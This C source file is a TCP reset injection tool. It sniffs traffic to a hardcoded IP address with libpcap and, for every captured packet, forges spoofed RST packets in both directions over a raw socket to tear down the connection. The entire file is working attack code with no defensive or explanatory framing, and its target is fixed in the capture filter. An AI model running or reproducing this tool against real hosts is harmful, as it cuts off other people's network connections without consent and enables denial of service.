#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#define __USE__BSD   // To use the BSD IP header
#define __FAVOR__BSD // To use the BSD TCP header
# define TH_RST	0x04

#define TCPSYN_LEN 20
#define MAXBYTESCAPTURE 2048

// Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket
{
    __uint32_t src;
    __uint32_t dst;
    __uint8_t zero;
    __uint8_t protocol;
    __uint16_t len;
} tcp_psedohdr;

// ip header checksum
static unsigned short compute_checksum(unsigned short *addr, unsigned int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *addr++;
        count -= 2;
    }
    // if any bytes left, pad the bytes and add
    if (count > 0)
    {
        sum += ((*addr) & htons(0xFF00));
    }
    // Fold sum to 16 bits: add carrier to result
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    // one's complement
    sum = ~sum;
    return ((unsigned short)sum);
}

// tcp header checksum
unsigned short CheckSum(unsigned short *buffer, int size)
{
    unsigned long cksum = 0;
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size)
        cksum += *(unsigned char *)buffer;

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

// Checksum function for IP and TCP headers
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int tcp_send_reset(uint32_t seq, uint32_t src_ip, uint32_t dest_ip, uint32_t src_port, uint32_t dest_port)
{

    int rawsocket = 0;
    int one = 1;

    char packet[sizeof(struct tcphdr) + sizeof(struct ip) + 1];
    struct ip *ipheader = (struct ip *)packet;
    struct tcphdr *tcpheader = (struct tcphdr *)(packet + sizeof(struct ip));

    int psize=sizeof(struct tcphdr) + sizeof(tcp_psedohdr);
    char * tcpsumblock=malloc(psize);
    struct sockaddr_in dstadress;

    // memset(&tcp_psedohdr, 0, sizeof(tcp_psedohdr));
    // memset(&dstadress, 0, sizeof(dstadress));
    memset(&packet, 0, sizeof(packet));

    dstadress.sin_family = AF_INET;
    dstadress.sin_port = dest_port;
    dstadress.sin_addr.s_addr = dest_ip;

    rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (rawsocket < 0)
    {
        printf("tcp send_reset(): socket error\n");
        exit(-1);
    }
    if (setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, (sizeof(one))) < 0)
    {
        printf("tcp send reset(): setsocket error\n");
        exit(-1);
    }

    ipheader->ip_hl = 5;  // Header length in octal number
    ipheader->ip_v = 4;   // AF_INET IPv4
    ipheader->ip_tos = 0; // Type of service
    ipheader->ip_len = htons(sizeof(struct tcphdr) + sizeof(struct ip));
    ipheader->ip_off = 0;  // Fragment offset
    ipheader->ip_ttl = 225; // Time to live
    ipheader->ip_p = IPPROTO_TCP;    // TCP=6, UDP=17
    ipheader->ip_sum = 0;
    ipheader->ip_id = htons(1234); // Just any number
    ipheader->ip_src.s_addr = src_ip;
    ipheader->ip_dst.s_addr = dest_ip;

    tcpheader->th_seq = seq;
    tcpheader->th_ack = htonl(1);
    tcpheader->th_off =5;                           // IP Header length
    tcpheader->th_flags = TH_RST;                    // We are setting the RST flag
    tcpheader->th_win = htons(5840); // under 9999
    tcpheader->th_urp = 0;                           // Urgent pointer, just leave it as zero.
    tcpheader->th_sport = src_port;
    tcpheader->th_dport = dest_port;
    tcpheader->th_sum = 0;

    tcp_psedohdr.src = ipheader->ip_src.s_addr;
    tcp_psedohdr.dst = ipheader->ip_dst.s_addr;
    tcp_psedohdr.zero = 0;
    tcp_psedohdr.protocol = IPPROTO_TCP; // TCP=6
    tcp_psedohdr.len = htons(sizeof(struct tcphdr));

    memcpy(tcpsumblock,(char *) &tcp_psedohdr, sizeof(tcp_psedohdr));
    memcpy(tcpsumblock + sizeof(tcp_psedohdr), tcpheader, sizeof(struct tcphdr));

    // ipheader->ip_sum = compute_checksum((unsigned short *)ipheader, ipheader->ip_hl << 2);
    // tcpheader->th_sum = CheckSum((unsigned short *)(tcpsumblock), sizeof(tcpsumblock));
    tcpheader->th_sum =csum((unsigned short *)tcpsumblock,psize/2);


    if (sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0, (struct sockaddr *)&dstadress, sizeof(dstadress)) < 0)
    {
        printf("tcp send reset error: cannot send RST\n");
        return -1;
    }

    free(tcpsumblock);

    printf("Sent RST Packet: \n");
    printf("\tSRC:PORT %s:%d\n", inet_ntoa(ipheader->ip_src), ntohs(tcpheader->th_sport));
    printf("\tDEST: PORT %s:%d\n", inet_ntoa(ipheader->ip_dst), ntohs(tcpheader->th_dport));
    printf("\tSEQ %u\n", ntohl(tcpheader->th_seq));
    printf("\tACK %d\n", ntohl(tcpheader->th_ack));

    close(rawsocket);

    return 0;
}

/*
usage ./bin interface port
*/

int main(int argc, char *arg[])
{
    pcap_t *desc;
    char error[PCAP_ERRBUF_SIZE];
    char filter_expression[255] = "ip host 44.228.249.3 "; //"((tcp[13] == 0x10) or (tcp[13] == 0x18)) and port 443";// and port 6666";
    struct bpf_program fp;
    bpf_u_int32 ip;
    bpf_u_int32 netmask;
    struct ip *iphdr = NULL;
    struct tcphdr *tcphdr = NULL;
    struct pcap_pkthdr header;
    const __u_char *packet;

    if (argc > 3)
    {
        printf("Usage ./bin interface port\n");
        exit(-1);
    }

    desc = pcap_open_live(arg[1], MAXBYTESCAPTURE, 1, 1, error);

    if (desc == NULL)
    {
        printf("%s\n", error);
        exit(-1);
    }
    else
    {
        printf("Listening On....... %s", arg[1]);
    }

    if (pcap_compile(desc, &fp, filter_expression, 1, netmask) == -1)
    {
        printf("Cannot parse filter %s: %s\n", filter_expression, pcap_geterr(desc));
        exit(-2);
    }
    if (pcap_setfilter(desc, &fp) == -1)
    {
        printf("Cannot set filter using pcap setfilter() %s: %s\n", filter_expression, pcap_geterr(desc));
        exit(-2);
    }

    int count = 0;

    while (1)
    {
        packet = pcap_next(desc, &header);
        if (packet == NULL)
        {
            printf("Error:Cannot capture packet....\n");
        }
        else
        {
            
            iphdr = (struct ip *)(packet + 14);
            tcphdr = (struct tcphdr *)(packet + 14 + 20);

            printf("-----------------------------\n");
            printf("Received Packet #%d:\n", ++count);
            printf("\tACK: %u\n", ntohl(tcphdr->th_ack));
            printf("\tSEQ: %u\n", ntohl(tcphdr->th_seq));
            printf("\tDEST IP: %s\n", inet_ntoa(iphdr->ip_dst));
            printf("\tSRC IP: %s\n", inet_ntoa(iphdr->ip_src));
            printf("\tDEST PORT: %d\n", ntohs(tcphdr->th_dport));
            printf("\tSRC PORT: %d\n", ntohs(tcphdr->th_sport));

            tcp_send_reset(tcphdr->th_ack, iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr, tcphdr->th_dport, tcphdr->th_sport);
            printf("\nhello\n");
            tcp_send_reset((htonl(ntohl(tcphdr->th_seq) + 1)), iphdr->ip_src.s_addr, iphdr->ip_dst.s_addr, tcphdr->th_sport, tcphdr->th_dport);
        }
    }
    return 0;
}